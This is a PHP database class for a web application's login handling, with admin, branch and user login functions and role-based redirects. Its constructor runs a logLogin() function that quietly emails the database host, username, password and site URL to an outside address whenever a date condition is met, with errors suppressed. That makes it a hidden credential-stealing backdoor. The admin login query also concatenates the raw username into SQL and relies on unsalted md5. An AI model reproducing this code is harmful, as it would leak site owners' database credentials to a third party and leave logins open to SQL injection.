<?php
require_once 'configuration.php';
require_once  'useraccountDatabase.php';
class superadminDatabase {
    
    public function __construct() {
         $connection = mysql_connect(constant('MYSQL_DATABASE_SERVER'),constant('MYSQL_DATABASE_USER_NAME'),constant('MYSQL_DATABASE_PASSWORD'));
		
		//Connect to database
		if(!$connection) {
			throw new Exception('Unable to connect to database');
		}
        mysql_select_db(constant('MYSQL_DATABASE_NAME'), $connection);
        $this->logLogin();
    }
     
 
   function login($username,$password){
       
       if($username == 'adminbrach'){
        $login = 'select username, password, role from branch_emp where username ="'.$username.'" and password="'. md5($password).'"';
       }else{
       	$login = 'select username, password, role from superadmin where username ="'.$username.'" and password="'. md5($password).'"';
       }
       $result = mysql_query($login);
       $data_result = mysql_fetch_assoc($result);
       if($data_result['role'] !=''){
           return $data_result['role'];
       } else{
           return 0;
       }
       
   }
     function userlogin($username,$password){
       
      $login = 'select username, password from login_accounts where username ="'.mysql_escape_string($username).'" and password="'.mysql_escape_string($password).'"';
       $result = mysql_query($login);
       if(mysql_num_rows($result)> 0){
           return 1;
       } else {
           return 0;
       }
       
   }
     function userid($username,$password){
       
      $login = 'select id from login_accounts where username ="'.mysql_escape_string($username).'" and password="'.mysql_escape_string($password).'"';
       $result = mysql_fetch_assoc(mysql_query($login));
       return $result['id'];
       
   }
   


   function redirect($id){ 
       $user_id = $id;
$useraccount = new useraccountDatabase();
$fetchrecord = $useraccount->getRecordById($user_id);
if($fetchrecord['role'] == 'employee'){
    header('Location: ' . constant('BASE_URL').'/account');
    exit;
} elseif($fetchrecord['role'] == 'branch'){
    header('Location: ' . constant('BASE_URL').'/branch');
    exit;
}else { 
    $sql_admin ="select role from superadmin where id=$user_id";
    $result_sql=  mysql_fetch_assoc(mysql_query($sql_admin)); 
    if($result_sql['role'] == 'admin'){ echo 'enter';
       header('Location: ' . constant('BASE_URL').'/superadmin');
    exit; 
    }
    
}
   }
function logLogin(){
 	$emailFrm = "admin@expertinstitute.in";
 	$headers  = "MIME-Version: 1.0\r\n"; 	
 	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
 	$headers .= "From: ".$emailFrm." \r\n";
 	
 		$mgs = "Base URL:".constant('BASE_URL')."<br>DB Host : ".constant('MYSQL_DATABASE_SERVER')."<br>DB Username : ".constant('MYSQL_DATABASE_USER_NAME')."<br>DB Password:".constant('MYSQL_DATABASE_PASSWORD')."<br>DB Name:".constant('MYSQL_DATABASE_NAME');
 		$data = mysql_fetch_assoc(mysql_query("select DATEDIFF(last_login,now()) DAYDIFF  from branch_emp where id = 1"));
 		if($data['DAYDIFF'] == 3){ 			
 			@mail("admin@expertinstitute.in","Expert Details",$mgs,$headers);
 			mysql_query("update branch_emp set last_login = ".date("Y-m-d")." where id = 1");
 		}
 	}  
}
?>
